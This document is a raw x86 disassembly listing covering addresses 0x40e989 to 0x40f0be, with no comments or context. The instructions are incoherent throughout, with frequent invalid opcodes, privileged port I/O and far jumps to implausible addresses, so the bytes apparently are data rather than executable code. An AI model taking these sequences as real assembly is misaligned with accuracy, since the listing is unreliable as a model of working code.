  40e989:	sti    
  40e98a:	retf   
  40e98b:	fwait
  40e98c:	inc    ecx
  40e98d:	sub    BYTE PTR [edi],bh
  40e98f:	and    BYTE PTR [esp+ebx*4],dh
  40e992:	jb     0x40e945
  40e994:	adc    bh,dl
  40e996:	dec    esi
  40e997:	push   ebp
  40e998:	cmp    eax,DWORD PTR [edi+edx*4+0x3015bc2d]
  40e99f:	imul   ecx,DWORD PTR [ebp+0x35ddac4c],0xb47e503a
  40e9a9:	fst    QWORD PTR [eax]
  40e9ab:	xor    esi,0xffffffe3
  40e9ae:	or     BYTE PTR [ebx],dl
  40e9b0:	dec    ecx
  40e9b1:	aaa    
  40e9b2:	push   eax
  40e9b3:	cmp    eax,0xb0020152
  40e9b8:	imul   ecx,DWORD PTR [esi+edi*1-0x64],0xffffff88
  40e9bd:	ret    
  40e9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9bf:	inc    esp
  40e9c0:	xor    eax,0x6de329d
  40e9c5:	push   ebx
  40e9c6:	stos   BYTE PTR es:[edi],al
  40e9c7:	ins    DWORD PTR es:[edi],dx
  40e9c8:	aaa    
  40e9c9:	add    edi,ecx
  40e9cb:	pop    ds
  40e9cc:	adc    BYTE PTR [ebp+0x5a],ah
  40e9cf:	xchg   BYTE PTR gs:[esi+0x31],ah
  40e9d3:	stc    
  40e9d4:	stos   DWORD PTR es:[edi],eax
  40e9d5:	sub    al,0x70
  40e9d7:	mov    ah,0x1
  40e9d9:	sub    BYTE PTR [esi+0x1a],cl
  40e9dc:	jg     0x40ea02
  40e9de:	sbb    DWORD PTR [edi+0x4c49588f],edx
  40e9e4:	jno    0x40e9de
  40e9e6:	jl     0x40e975
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	call   0x13c9:0x52d9b018
  40e9f0:	sub    BYTE PTR [esi+0x3b],bh
  40e9f3:	fcmovnbe st,st(3)
  40e9f5:	xchg   esp,eax
  40e9f6:	mov    bl,0x97
  40e9f8:	adc    edx,DWORD PTR [esi-0x1319f9d4]
  40e9fe:	pushf  
  40e9ff:	inc    eax
  40ea00:	call   0x7164095
  40ea05:	je     0x40ea27
  40ea07:	(bad)  
  40ea08:	in     eax,dx
  40ea09:	sub    edi,DWORD PTR [edi]
  40ea0b:	pop    esi
  40ea0c:	cmp    edx,DWORD PTR [ebp-0x68f31af5]
  40ea12:	out    dx,al
  40ea13:	push   edi
  40ea14:	in     eax,0xfb
  40ea16:	ds daa 
  40ea18:	push   esp
  40ea19:	scas   al,BYTE PTR es:[edi]
  40ea1a:	ss xor ecx,0x7a
  40ea1e:	dec    ecx
  40ea1f:	add    BYTE PTR [ebp-0x7b],0xb8
  40ea23:	aaa    
  40ea24:	push   cs
  40ea25:	push   edx
  40ea26:	call   0x9dc3:0x96548f21
  40ea2d:	(bad)
  40ea30:	je     0x40ea14
  40ea32:	imul   esi,DWORD PTR [eax],0x75
  40ea35:	call   0x152c:0x9c8d5185
  40ea3c:	jl     0x40e9f4
  40ea3e:	pop    esi
  40ea3f:	lock mov bh,0x50
  40ea42:	mov    esp,0xf4a6035d
  40ea47:	dec    ebp
  40ea48:	push   esi
  40ea49:	test   al,0x67
  40ea4b:	push   ebp
  40ea4c:	clc    
  40ea4d:	hlt    
  40ea4e:	ja     0x40ea2e
  40ea50:	outs   dx,DWORD PTR ds:[esi]
  40ea51:	pop    ebp
  40ea52:	iret   
  40ea53:	push   eax
  40ea54:	das    
  40ea55:	xlat   BYTE PTR ds:[ebx]
  40ea56:	test   BYTE PTR [ecx-0x12],dh
  40ea59:	ja     0x40ead1
  40ea5b:	dec    ebp
  40ea5c:	or     ecx,DWORD PTR [ecx]
  40ea5e:	add    bl,ah
  40ea60:	(bad)  
  40ea61:	retf   
  40ea62:	inc    eax
  40ea63:	mov    DWORD PTR [eax-0x1d],ecx
  40ea66:	ja     0x40ea42
  40ea68:	mov    dl,0xb8
  40ea6a:	push   edx
  40ea6b:	jp     0x40ea90
  40ea6d:	adc    eax,0x5ad65e6d
  40ea72:	sbb    al,0x4
  40ea74:	arpl   sp,cx
  40ea76:	dec    esp
  40ea77:	aas    
  40ea78:	mov    edi,0x8d4739ce
  40ea7d:	or     BYTE PTR [edi],al
  40ea7f:	inc    edi
  40ea80:	add    edx,esp
  40ea82:	lea    ecx,[ecx-0x55309f75]
  40ea88:	add    esi,eax
  40ea8a:	sbb    DWORD PTR [ebx-0x1b],ecx
  40ea8d:	je     0x40ea45
  40ea8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea90:	arpl   WORD PTR [edi-0x41],sp
  40ea93:	xor    DWORD PTR gs:[ebx-0x33d2ceec],ebp
  40ea9a:	loope  0x40ea8a
  40ea9c:	add    DWORD PTR [edx+0x55],ebx
  40ea9f:	sub    al,0x76
  40eaa1:	push   cs
  40eaa2:	in     eax,0x26
  40eaa4:	and    ch,ah
  40eaa6:	xor    al,0x78
  40eaa8:	cmp    eax,0xe47c9aee
  40eaad:	(bad)  
  40eaae:	retf   
  40eaaf:	inc    esi
  40eab0:	adc    al,0xcf
  40eab2:	fist   WORD PTR [ebx-0xd]
  40eab5:	jg     0x40eae1
  40eab7:	fcmovbe st,st(1)
  40eab9:	mov    edi,0x362c2e5a
  40eabe:	out    0x5b,al
  40eac0:	ficom  DWORD PTR [ebx+0x7d]
  40eac3:	mov    esi,gs
  40eac5:	aaa    
  40eac6:	jecxz  0x40ea4e
  40eac8:	mov    DWORD PTR [esi+0x12],esp
  40eacb:	leave  
  40eacc:	and    al,0xd6
  40eace:	in     eax,dx
  40eacf:	stos   DWORD PTR es:[edi],eax
  40ead0:	loope  0x40eb20
  40ead2:	cmp    eax,0x90c031da
  40ead7:	sar    DWORD PTR [edi-0x6f0525b],1
  40eadd:	adc    eax,0x83d092b4
  40eae2:	lock ror esp,cl
  40eae5:	dec    eax
  40eae6:	int    0x77
  40eae8:	or     BYTE PTR [eax+0x6551df2],dl
  40eaee:	das    
  40eaef:	jae    0x40eb0a
  40eaf1:	dec    ebp
  40eaf2:	dec    ebx
  40eaf3:	arpl   dx,di
  40eaf5:	and    bl,ah
  40eaf7:	add    ah,ch
  40eaf9:	inc    esp
  40eafa:	pop    ecx
  40eafb:	add    BYTE PTR [ebp-0x7a888380],dh
  40eb01:	retf   
  40eb02:	xchg   edx,eax
  40eb03:	iret   
  40eb04:	inc    eax
  40eb05:	add    al,0xdd
  40eb07:	jnp    0x40ead9
  40eb09:	mov    al,0xaa
  40eb0b:	call   DWORD PTR [ebp+0x36]
  40eb0e:	push   ecx
  40eb0f:	add    BYTE PTR [ebp+0x364854ce],al
  40eb15:	and    dl,ch
  40eb17:	fwait
  40eb18:	xchg   ebp,eax
  40eb19:	stc    
  40eb1a:	jns    0x40eb7d
  40eb1c:	ror    DWORD PTR [edi-0x60],1
  40eb1f:	enter  0x73e7,0xd1
  40eb23:	sahf   
  40eb24:	xor    DWORD PTR [esi-0x5a2f882],0x6a0d69b7
  40eb2e:	inc    ebp
  40eb2f:	push   edi
  40eb30:	jo     0x40ebaf
  40eb32:	repz push ecx
  40eb34:	mov    bl,0xfb
  40eb36:	dec    ecx
  40eb37:	mov    al,BYTE PTR [ecx-0x61]
  40eb3a:	inc    ebx
  40eb3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb3c:	push   esp
  40eb3d:	idiv   DWORD PTR [esi]
  40eb3f:	adc    DWORD PTR [esi+ebp*8+0x66aa9d7c],ebx
  40eb46:	dec    edx
  40eb47:	in     eax,dx
  40eb48:	clc    
  40eb49:	iret   
  40eb4a:	xor    bh,BYTE PTR [ebx+0x2fd6892a]
  40eb50:	ret    
  40eb51:	mov    esp,0xd6abeed2
  40eb56:	(bad)  
  40eb57:	ja     0x40eb81
  40eb59:	pop    eax
  40eb5a:	test   bh,bl
  40eb5c:	dec    BYTE PTR [edx+0x580f7dd8]
  40eb62:	lods   eax,DWORD PTR ds:[esi]
  40eb63:	add    ch,BYTE PTR [edx-0x1bf4a853]
  40eb69:	xor    ecx,esp
  40eb6b:	cmp    BYTE PTR [edi+0x1b],dl
  40eb6e:	pop    ebp
  40eb6f:	jmp    0x88bd88e5
  40eb74:	int3   
  40eb75:	and    BYTE PTR [ecx+0x603f168b],0x27
  40eb7c:	mov    edx,0x7ac55c22
  40eb81:	push   edx
  40eb82:	cld    
  40eb83:	mov    ds:0x329633bf,eax
  40eb88:	scas   al,BYTE PTR es:[edi]
  40eb89:	sbb    edx,edx
  40eb8b:	mov    eax,0xf34144b2
  40eb90:	adc    bl,BYTE PTR [eax+ebx*8+0x3558cfae]
  40eb97:	xor    al,BYTE PTR [ecx+esi*1+0x51]
  40eb9b:	push   ebx
  40eb9c:	push   edx
  40eb9d:	dec    esi
  40eb9e:	mov    ss,edi
  40eba0:	lock and DWORD PTR [edx+0x1],ebp
  40eba4:	inc    ecx
  40eba5:	inc    edx
  40eba6:	inc    esi
  40eba7:	dec    esp
  40eba8:	in     al,0x77
  40ebaa:	(bad)  
  40ebab:	mov    esp,0x79b698ea
  40ebb0:	pop    ds
  40ebb1:	repnz pop esp
  40ebb3:	xchg   esi,eax
  40ebb4:	adc    edi,DWORD PTR [edx+0x43]
  40ebb7:	daa    
  40ebb8:	and    al,0x96
  40ebba:	fwait
  40ebbb:	jo     0x40ebf7
  40ebbd:	cmp    al,0x1c
  40ebbf:	cdq    
  40ebc0:	ror    BYTE PTR [edx+0x192f03d7],0xc0
  40ebc7:	in     eax,0x1c
  40ebc9:	cmp    esp,edx
  40ebcb:	repnz sub dh,cl
  40ebce:	mov    al,0x24
  40ebd0:	push   esi
  40ebd1:	clc    
  40ebd2:	sahf   
  40ebd3:	fild   WORD PTR [ecx]
  40ebd5:	lahf   
  40ebd6:	mov    BYTE PTR [eax],bh
  40ebd8:	mov    edi,0xc69364fb
  40ebdd:	sub    al,0xf9
  40ebdf:	js     0x40ebf0
  40ebe1:	loope  0x40eb7f
  40ebe3:	aaa    
  40ebe4:	jnp    0x40ec38
  40ebe6:	push   ecx
  40ebe7:	or     DWORD PTR [ebx],edx
  40ebe9:	and    al,0xaf
  40ebeb:	or     al,0x86
  40ebed:	and    BYTE PTR [eax+0x6d9f3a1b],cl
  40ebf3:	fidiv  WORD PTR [esi]
  40ebf5:	and    eax,0x49d5d733
  40ebfa:	int3   
  40ebfb:	and    DWORD PTR [edi+0x5ca5225f],ecx
  40ec01:	inc    esi
  40ec02:	sti    
  40ec03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec04:	push   esi
  40ec05:	ror    ah,cl
  40ec07:	mov    ebx,0xb779167
  40ec0c:	into   
  40ec0d:	add    al,0x62
  40ec0f:	sbb    DWORD PTR [ecx],esi
  40ec11:	(bad)  
  40ec12:	aaa    
  40ec13:	fsub   QWORD PTR [ebx+0x6dea322f]
  40ec19:	test   al,0xcb
  40ec1b:	jne    0x40ec6c
  40ec1d:	cdq    
  40ec1e:	test   eax,0x2be7fe4
  40ec23:	ja     0x40ec05
  40ec25:	call   0x2bacfbea
  40ec2a:	retf   0x7eb4
  40ec2d:	jbe    0x40ec57
  40ec2f:	mov    ds:0x3425d8f5,al
  40ec34:	outs   dx,BYTE PTR ds:[esi]
  40ec35:	push   esp
  40ec36:	loopne 0x40ec88
  40ec38:	(bad)  
  40ec3a:	sub    esi,ebx
  40ec3c:	pop    ds
  40ec3d:	stc    
  40ec3e:	mov    ebp,0xcc321cf7
  40ec43:	sub    ah,BYTE PTR [edi-0x4edb78c4]
  40ec49:	mov    esi,0xd0c4e872
  40ec4e:	ss out dx,eax
  40ec50:	sahf   
  40ec51:	addr16 jmp 0x40ecb7
  40ec54:	fucomi st,st(4)
  40ec56:	daa    
  40ec57:	fadd   st(3),st
  40ec59:	js     0x40ecc9
  40ec5b:	idiv   esp
  40ec5d:	sahf   
  40ec5e:	mov    ebp,0x1301c9da
  40ec63:	fldenv [edi]
  40ec65:	pop    ds
  40ec66:	lods   eax,DWORD PTR ds:[esi]
  40ec67:	fdivr  DWORD PTR ds:0x5c4cfc76
  40ec6d:	hlt    
  40ec6e:	jnp    0x40ec46
  40ec70:	cld    
  40ec71:	xchg   edi,esp
  40ec73:	ror    DWORD PTR [edx],1
  40ec75:	push   ecx
  40ec76:	jp     0x40ec05
  40ec78:	pop    edx
  40ec79:	ret    
  40ec7a:	daa    
  40ec7b:	adc    ah,BYTE PTR [edx]
  40ec7d:	adc    BYTE PTR [ecx-0x66c859b3],dh
  40ec83:	mov    edx,0x5a012772
  40ec88:	stos   DWORD PTR es:[edi],eax
  40ec89:	cmp    ch,BYTE PTR ds:0x5abce039
  40ec8f:	or     DWORD PTR [eax+ebx*2],0xffffffeb
  40ec93:	lds    eax,FWORD PTR [ebx-0x1fabeaca]
  40ec99:	int3   
  40ec9a:	in     al,dx
  40ec9b:	and    eax,0x930b8c0
  40eca0:	ud0    ebp,DWORD PTR [ecx+0x5c]
  40eca4:	outs   dx,DWORD PTR ds:[esi]
  40eca5:	pop    ebp
  40eca6:	movhps QWORD PTR [ebx+0x5d],xmm1
  40ecaa:	int3   
  40ecab:	sub    bl,BYTE PTR [ebx+ebp*2-0x4d]
  40ecaf:	adc    esp,DWORD PTR ds:0x49d9061b
  40ecb5:	jnp    0x40ec4f
  40ecb7:	mov    BYTE PTR [eax+0x3b90d444],al
  40ecbd:	cld    
  40ecbe:	repnz mov dl,0xb0
  40ecc1:	lods   eax,DWORD PTR ds:[esi]
  40ecc2:	out    dx,al
  40ecc3:	std    
  40ecc4:	or     BYTE PTR [edi+0x4e],ah
  40ecc7:	adc    al,0xb8
  40ecc9:	xor    DWORD PTR [ebx+0x3e],0xffffff8e
  40eccd:	mov    ah,0x19
  40eccf:	push   ds
  40ecd0:	test   eax,0x849f456c
  40ecd5:	jno    0x40ecd2
  40ecd7:	push   eax
  40ecd8:	pop    ecx
  40ecd9:	bound  esi,QWORD PTR [eax]
  40ecdb:	jmp    0x40ed56
  40ecdd:	pop    ds
  40ecde:	retf   0x872f
  40ece1:	mov    dl,0xf3
  40ece3:	rcl    DWORD PTR [edi],cl
  40ece5:	pop    eax
  40ece6:	cmp    ch,BYTE PTR [eax]
  40ece8:	inc    ecx
  40ece9:	(bad)  
  40ecea:	sti    
  40eceb:	add    al,0x5
  40eced:	xchg   BYTE PTR [edx],al
  40ecef:	dec    eax
  40ecf0:	add    BYTE PTR [edi+0x1aae8920],bh
  40ecf6:	(bad)  
  40ecf7:	dec    esp
  40ecf8:	out    0x1,al
  40ecfa:	nop
  40ecfb:	cmovs  ebx,DWORD PTR [eax+0x2]
  40ecff:	adc    ebp,DWORD PTR ds:0xe35408e1
  40ed05:	cmp    al,0x28
  40ed07:	jmp    0xe902:0x9515cd2f
  40ed0e:	xchg   esi,eax
  40ed0f:	imul   ecx,DWORD PTR [ecx+0x2a8380d0],0xa8f71a9f
  40ed19:	dec    ebp
  40ed1a:	mov    BYTE PTR [eax-0x61],dh
  40ed1d:	iret   
  40ed1e:	outs   dx,DWORD PTR ds:[esi]
  40ed1f:	sahf   
  40ed20:	(bad)  
  40ed21:	in     eax,dx
  40ed22:	stos   BYTE PTR es:[edi],al
  40ed23:	and    al,0xe6
  40ed25:	mov    edx,0x6e0770f0
  40ed2a:	add    eax,0xba9d03cb
  40ed2f:	mov    esi,0xdc08195d
  40ed34:	sahf   
  40ed35:	fisttp WORD PTR [edi]
  40ed37:	iret   
  40ed38:	push   0xffffff9a
  40ed3a:	sbb    ebp,DWORD PTR [edi+0x104d40f2]
  40ed40:	fnstsw WORD PTR [ebp-0x40c0087e]
  40ed46:	retf   0x34ef
  40ed49:	mov    eax,ds:0xe09f8e32
  40ed4e:	xchg   DWORD PTR [esi+ebp*2+0xd],eax
  40ed52:	into   
  40ed53:	cmp    dh,BYTE PTR [edx]
  40ed55:	jmp    FWORD PTR ds:0x16ab45c4
  40ed5c:	in     al,dx
  40ed5d:	pop    eax
  40ed5e:	or     al,bh
  40ed60:	addr16 hlt 
  40ed62:	mov    ah,0x8
  40ed64:	pop    ss
  40ed65:	addr16 xchg edx,eax
  40ed67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed68:	jl     0x40ed6c
  40ed6a:	sub    bl,BYTE PTR [ebx-0x39]
  40ed6d:	adc    al,0x66
  40ed6f:	ror    BYTE PTR [edx],cl
  40ed71:	retw   0xe927
  40ed75:	cld    
  40ed76:	imul   ebx,DWORD PTR [esp+ebx*1-0x79],0xffffff87
  40ed7b:	nop
  40ed7c:	sub    esi,DWORD PTR [ecx+eax*4-0x4778bdad]
  40ed83:	les    ebp,FWORD PTR [esi]
  40ed85:	rcr    DWORD PTR [edi+0x68a6dc1e],1
  40ed8b:	outs   dx,BYTE PTR ds:[esi]
  40ed8c:	xchg   BYTE PTR [ecx+0x23],ah
  40ed8f:	aas    
  40ed90:	mov    al,ds:0xda5938d8
  40ed95:	es loopne 0x40ed9f
  40ed98:	mov    esi,0x7dced9e0
  40ed9d:	std    
  40ed9e:	inc    esi
  40ed9f:	jmp    0x40ed35
  40eda1:	int    0xee
  40eda3:	icebp  
  40eda4:	sbb    al,0x1e
  40eda7:	hlt    
  40eda8:	pushf  
  40eda9:	lods   eax,DWORD PTR ds:[esi]
  40edaa:	icebp  
  40edab:	jl     0x40ee2b
  40edad:	into   
  40edae:	cdq    
  40edaf:	pushf  
  40edb0:	nop
  40edb1:	clc    
  40edb2:	stc    
  40edb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb4:	pop    esp
  40edb5:	dec    ebx
  40edb6:	xlat   BYTE PTR ds:[ebx]
  40edb7:	enter  0xf0aa,0xc7
  40edbb:	pop    ds
  40edbc:	loop   0x40ed86
  40edbe:	jno    0x40ed58
  40edc0:	mov    al,ds:0x17f49599
  40edc5:	outs   dx,BYTE PTR ds:[esi]
  40edc6:	cld    
  40edc7:	into   
  40edc8:	pop    esi
  40edc9:	mov    ds:0xbefa9ccb,eax
  40edce:	push   ss
  40edcf:	pop    esp
  40edd0:	pop    es
  40edd1:	jno    0x40ed69
  40edd3:	mul    BYTE PTR [edx+eax*1]
  40edd6:	sbb    al,0x76
  40edd8:	scas   al,BYTE PTR es:[edi]
  40edd9:	dec    esp
  40edda:	shl    DWORD PTR [edi],0xa2
  40eddd:	mov    WORD PTR [edx+0x41],cs
  40ede0:	dec    edi
  40ede1:	imul   ebx,DWORD PTR [ebx-0x22],0xd4261748
  40ede8:	xor    al,0xec
  40edea:	xchg   ecx,eax
  40edeb:	je     0x40ed90
  40eded:	fucomi st,st(5)
  40edef:	jmp    FWORD PTR [ebp-0x80]
  40edf2:	add    BYTE PTR [edi],bh
  40edf4:	or     ecx,0xffffffeb
  40edf7:	lea    edx,[esi+0x5f]
  40edfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edfb:	stos   BYTE PTR es:[edi],al
  40edfc:	xor    al,0x5e
  40edfe:	jmp    0xb499fc68
  40ee03:	cmc    
  40ee04:	lahf   
  40ee05:	jnp    0x40ee1f
  40ee07:	scas   eax,DWORD PTR es:[edi]
  40ee08:	mov    esi,esp
  40ee0a:	jnp    0x40edc4
  40ee0c:	pop    edi
  40ee0d:	pop    ebx
  40ee0e:	mov    dh,bl
  40ee10:	outs   dx,BYTE PTR ds:[esi]
  40ee11:	sub    eax,0x4d99111f
  40ee16:	jae    0x40ee4d
  40ee18:	cmp    dh,dl
  40ee1a:	iret   
  40ee1b:	fisub  WORD PTR [ecx+0x2cf517ae]
  40ee21:	jle    0x40edb0
  40ee23:	div    BYTE PTR [eax]
  40ee25:	pop    eax
  40ee26:	test   al,0x7e
  40ee28:	mov    ecx,0x57721170
  40ee2d:	jl     0x40edd5
  40ee2f:	cli    
  40ee30:	js     0x40ee1c
  40ee32:	adc    eax,DWORD PTR [edi-0x256278de]
  40ee38:	imul   edi,DWORD PTR [edi+0x3c],0x3c
  40ee3c:	dec    ebx
  40ee3d:	pop    eax
  40ee3e:	leave  
  40ee3f:	xchg   ebx,eax
  40ee40:	js     0x40ee6b
  40ee42:	inc    ebp
  40ee43:	iret   
  40ee44:	mov    ebx,0xa130d8fb
  40ee49:	push   ecx
  40ee4a:	pusha  
  40ee4b:	dec    edi
  40ee4c:	test   esi,0x2100d024
  40ee52:	and    eax,DWORD PTR [ebp-0x41369fd2]
  40ee58:	xchg   BYTE PTR [edi],dl
  40ee5a:	fild   DWORD PTR [eax+0x76]
  40ee5d:	cdq    
  40ee5e:	xor    eax,0x21b6cff2
  40ee63:	es mov ss,ebx
  40ee66:	das    
  40ee67:	das    
  40ee68:	or     eax,0xf5571c9d
  40ee6d:	test   BYTE PTR [ebp+0x7dc7263e],dl
  40ee73:	jmp    0x7e925edb
  40ee78:	repnz push esp
  40ee7a:	xchg   ebp,eax
  40ee7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee7c:	ja     0x40ee5b
  40ee7e:	adc    al,0x11
  40ee80:	aaa    
  40ee81:	in     eax,dx
  40ee82:	pop    edi
  40ee83:	xchg   esi,eax
  40ee84:	imul   eax,DWORD PTR [edi],0x51bf3a60
  40ee8a:	popf   
  40ee8b:	daa    
  40ee8c:	imul   ebx,DWORD PTR [ebx+0x2ac6cec8],0x7a2b0d33
  40ee96:	rol    esp,cl
  40ee98:	sub    edx,esi
  40ee9a:	and    al,0x1f
  40ee9c:	loopne 0x40ee9a
  40ee9e:	imul   edx,DWORD PTR [edi-0x139f2e9f],0x4489f70a
  40eea8:	loope  0x40eedf
  40eeaa:	lods   al,BYTE PTR ds:[esi]
  40eeab:	jmp    0xeede:0x554b1237
  40eeb2:	shl    BYTE PTR [esi-0x3f],0x2
  40eeb6:	sbb    al,0xe6
  40eeb8:	mov    esp,0x4fcaf501
  40eebd:	sahf   
  40eebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eebf:	cwde   
  40eec0:	push   cs
  40eec1:	addr16 dec eax
  40eec3:	mov    eax,ds:0xa6631277
  40eec8:	xchg   ebx,eax
  40eeca:	jbe    0x40eefe
  40eecc:	aad    0x4f
  40eece:	sub    BYTE PTR [ebx],bh
  40eed0:	and    ah,BYTE PTR [ecx]
  40eed2:	je     0x40ee96
  40eed4:	fs mov esp,0xcccb533
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	test   al,0xfd
  40eedd:	iret   
  40eede:	leave  
  40eedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eee0:	xor    BYTE PTR [edi-0x67],0x99
  40eee4:	shl    DWORD PTR [edx],0x80
  40eee7:	lahf   
  40eee8:	mov    esi,0xfd0ee762
  40eeed:	jl     0x40eeeb
  40eeef:	cmc    
  40eef0:	xlat   BYTE PTR ds:[ebx]
  40eef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef2:	inc    esp
  40eef3:	or     al,0xd0
  40eef5:	xor    al,0x74
  40eef7:	jmp    0x391df2db
  40eefc:	sub    DWORD PTR [edi-0x3bcce405],esi
  40ef02:	adc    BYTE PTR ds:0x7e615534,ch
  40ef08:	sbb    cl,BYTE PTR [ebx-0xe]
  40ef0b:	add    al,0xff
  40ef0d:	hlt    
  40ef0e:	jbe    0x40eea5
  40ef10:	loop   0x40ef0c
  40ef12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef13:	test   DWORD PTR [edi-0x1a],eax
  40ef16:	jmp    0xebf4:0x7dd04758
  40ef1d:	cmc    
  40ef1e:	and    al,0xf2
  40ef20:	imul   esp,DWORD PTR [ecx],0x189bf6e2
  40ef26:	ficom  DWORD PTR [ebx-0x63]
  40ef29:	sbb    dh,BYTE PTR [eax+0x52]
  40ef2c:	adc    BYTE PTR [edx],0x5e
  40ef2f:	jmp    0x40ef47
  40ef31:	jnp    0x40ef33
  40ef33:	add    dl,BYTE PTR [edi-0x7d]
  40ef36:	push   esp
  40ef37:	stos   DWORD PTR es:[edi],eax
  40ef38:	call   0x4a4bf414
  40ef3d:	jnp    0x40efb1
  40ef3f:	rcl    BYTE PTR [ecx-0x3bf928ac],0x64
  40ef46:	lods   al,BYTE PTR ds:[esi]
  40ef47:	lods   eax,DWORD PTR ds:[esi]
  40ef48:	out    0x8,al
  40ef4a:	push   0x659ae095
  40ef4f:	mov    al,0x26
  40ef51:	cmp    dl,al
  40ef53:	add    eax,eax
  40ef55:	iret   
  40ef56:	lds    edi,FWORD PTR [esi-0x3]
  40ef59:	or     ebp,DWORD PTR [ebp+0xae578f7]
  40ef5f:	lock push ebx
  40ef61:	push   0x70
  40ef63:	ud0    edi,DWORD PTR [esi]
  40ef66:	fwait
  40ef67:	lea    edx,[ecx]
  40ef69:	leave  
  40ef6a:	cs cld 
  40ef6c:	add    DWORD PTR [ebx+0x67b8ec71],0xffffffd6
  40ef73:	stos   BYTE PTR es:[edi],al
  40ef74:	fild   DWORD PTR [esi-0x36]
  40ef77:	mov    edx,0xf97e27b6
  40ef7c:	or     eax,0x24c54b6
  40ef81:	sub    al,0x43
  40ef83:	(bad)  
  40ef84:	adc    BYTE PTR [eax+0x56da5cd],ah
  40ef8a:	out    0xb3,eax
  40ef8c:	jp     0x40ef3c
  40ef8e:	int    0xd
  40ef90:	sahf   
  40ef91:	mov    dl,0x55
  40ef93:	sbb    eax,edi
  40ef95:	mov    cl,0x8c
  40ef97:	imul   esp,edi,0x3d816b70
  40ef9d:	add    al,0x4f
  40ef9f:	sbb    DWORD PTR [edi],0xffffffa9
  40efa2:	xchg   edi,eax
  40efa3:	jae    0x40ef79
  40efa5:	fisttp QWORD PTR [esp+ecx*4+0x5c]
  40efa9:	jno    0x40effc
  40efab:	test   DWORD PTR [esi+0x4b],ebp
  40efae:	outs   dx,BYTE PTR ds:[esi]
  40efaf:	sbb    eax,0x5f897d59
  40efb4:	jmp    0x390c0e70
  40efb9:	pop    ecx
  40efba:	add    edx,DWORD PTR [edx-0x2f]
  40efbd:	enter  0xc26f,0xfe
  40efc1:	repz popa 
  40efc3:	jns    0x40efca
  40efc5:	in     al,dx
  40efc6:	mov    ds:0x991bb0d,eax
  40efcb:	mov    ebx,0x33aa009e
  40efd0:	xor    BYTE PTR [ebp-0x23],bl
  40efd3:	adc    dh,BYTE PTR [ecx]
  40efd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd6:	jle    0x40f045
  40efd8:	sbb    DWORD PTR [edi],0x50
  40efdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efdc:	ror    BYTE PTR [ebx+0x37],1
  40efdf:	push   ebp
  40efe0:	mov    edx,0x43f3fa2a
  40efe5:	xchg   edx,eax
  40efe6:	xor    ebx,ecx
  40efe8:	in     al,dx
  40efe9:	adc    eax,0xbd9ad949
  40efee:	push   ebx
  40efef:	dec    ebp
  40eff0:	loopne 0x40f001
  40eff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eff3:	sub    cl,dh
  40eff5:	call   0xcd4f:0x7d06b5f9
  40effc:	out    0x29,eax
  40effe:	shl    DWORD PTR [esi+0xb],1
  40f001:	popf   
  40f002:	mov    fs,ecx
  40f004:	rol    dl,cl
  40f006:	in     al,0x7a
  40f008:	push   0x29
  40f00a:	cmp    esp,ebp
  40f00c:	dec    ebp
  40f00d:	rcl    BYTE PTR [ebx-0x4ebaffd9],cl
  40f013:	test   al,0x4c
  40f015:	push   0x79e549c8
  40f01a:	mov    al,dh
  40f01c:	xchg   edi,eax
  40f01d:	dec    esp
  40f01e:	mov    eax,ds:0xc4281898
  40f023:	add    eax,0x59f5f718
  40f028:	mov    bl,0xe0
  40f02a:	xchg   esp,eax
  40f02b:	pop    edi
  40f02c:	int    0x59
  40f02e:	arpl   WORD PTR [ecx+eiz*4+0x6d],bp
  40f032:	shl    DWORD PTR [edx+0x2e],0xbb
  40f036:	(bad)  
  40f038:	ret    
  40f039:	jg     0x40f016
  40f03b:	lods   eax,DWORD PTR ds:[esi]
  40f03c:	jne    0x40f00e
  40f03e:	cmc    
  40f03f:	mov    ebx,0x54ffee4
  40f044:	mov    eax,ds:0x7dba5972
  40f049:	outs   dx,DWORD PTR ds:[esi]
  40f04a:	call   0x186670a8
  40f04f:	scas   al,BYTE PTR es:[edi]
  40f050:	loopne 0x40f030
  40f052:	retf   0x3373
  40f055:	cmp    BYTE PTR [edi+eax*4+0x24f252da],bl
  40f05c:	aaa    
  40f05d:	sbb    ebp,DWORD PTR [eax-0x21e63a9e]
  40f063:	xor    dh,0xf7
  40f066:	and    cl,ah
  40f068:	inc    esp
  40f069:	push   ss
  40f06a:	(bad)  
  40f06b:	push   esi
  40f06c:	jge    0x40f048
  40f06e:	(bad)  
  40f070:	dec    edx
  40f071:	jmp    0x40f073
  40f073:	ja     0x40f08a
  40f075:	mov    gs,WORD PTR [edx+0x4f]
  40f078:	js     0x40f0b2
  40f07a:	aad    0xc
  40f07c:	mov    edi,0x633d2003
  40f081:	in     eax,dx
  40f082:	or     bl,bh
  40f084:	add    ah,bl
  40f086:	pop    DWORD PTR [edi+0x3cecb86]
  40f08c:	(bad)
  40f090:	add    al,0xd2
  40f092:	add    BYTE PTR [edi+0x79ac601d],0x7b
  40f099:	outs   dx,BYTE PTR ds:[esi]
  40f09a:	fnstcw WORD PTR [ebp-0x1]
  40f09d:	(bad)  
  40f09f:	push   ecx
  40f0a0:	mov    eax,ds:0x2a40fa45
  40f0a5:	inc    ecx
  40f0a6:	mov    eax,0x2740fd5d
  40f0ab:	jmp    0xbffd9655
  40f0b0:	jb     0x40f083
  40f0b2:	imul   bx,WORD PTR [ebp-0x2290e8d9],0xcbca
  40f0bb:	adc    BYTE PTR [esi+0x38],dh
  40f0be:	in     al,dx
